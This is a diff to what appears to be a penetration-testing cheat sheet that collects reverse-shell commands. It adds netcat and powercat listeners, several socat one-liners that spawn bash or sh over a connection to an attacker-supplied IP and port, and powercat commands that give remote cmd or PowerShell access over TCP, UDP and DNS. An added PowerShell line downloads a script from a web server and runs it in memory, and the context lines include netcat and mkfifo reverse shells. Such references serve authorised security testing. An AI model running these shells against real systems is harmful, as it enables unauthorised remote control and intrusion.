@@ -163,6 +163,8 @@ Options: /c <COMMAND>
 
 #### Listener on host
 
+###### Netcat
+
 ```
 # TCP
 nc -lvnp <PORT>
@@ -172,6 +174,12 @@ nc -lvnpu <PORT>
 
 # ICMP
 python icmpsh_m.py <HOST_IP> <TARGET_IP>
+```
+
+###### [Windows] PowerCat
+
+```
+powercat -l -p 443 -ep
 ```
 
 #### One-liners reverse shell
@@ -195,6 +203,45 @@ nc.exe -e cmd.exe <IP> <PORT>
 
 # Else (Linux):
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> <PORT> >/tmp/f
+```
+
+###### [Linux] Socat
+
+`socat` is a command line utility that establishes two bidirectional byte
+streams and transfers data between them, often considered as a more advanced
+version of `netcat`. It can for example have multiple clients listening on a
+same port or reuse a connection. It is rarely present by default in Linux
+distributions.
+
+```
+socat tcp-connect:<IP>:<PORT> exec:"bash -li",pty,stderr,setsid,sigint,sane
+socat tcp-connect:<IP>:<PORT> exec:"/bin/bash -li",pty,stderr,setsid,sigint,sane
+socat tcp-connect:<IP>:<PORT> exec:"sh -li",pty,stderr,setsid,sigint,sane
+socat tcp-connect:<IP>:<PORT> exec:"/bin/sh -li",pty,stderr,setsid,sigint,sane
+```
+
+###### [Windows] PowerCat
+
+`powercat` is a PowerShell function, for Powershell Version 2 and later,
+providing the same functionalities as `netcat`.
+
+`powercat` can be used to transfer data and execute commands over TCP, UDP and
+DNS. It can be used to execute a local executable, such as `cmd`, `powershell`
+directly, or a custom payload.
+
+```
+As with any PowerShell function, powercat has to be loaded in memory to be executed
+. .\powercat.ps1
+IEX (New-Object System.Net.Webclient).DownloadString('http://<WEBSERVER_IP>:<WEBSERVER_PORT>/powercat.ps1')
+
+powercat -c <IP> -p <PORT> -e <BINARY>
+powercat -c <IP> -p <PORT> -ep
+
+# Over UDP
+powercat -u -c <IP> -p <PORT> -ep
+
+# Over DNS
+ powercat -c <DNS_SERVER_IP> -p <DNS_SERVER_PORT> -dns <DNS_HOSTNAME> -ep
 ```
 
 ###### Python
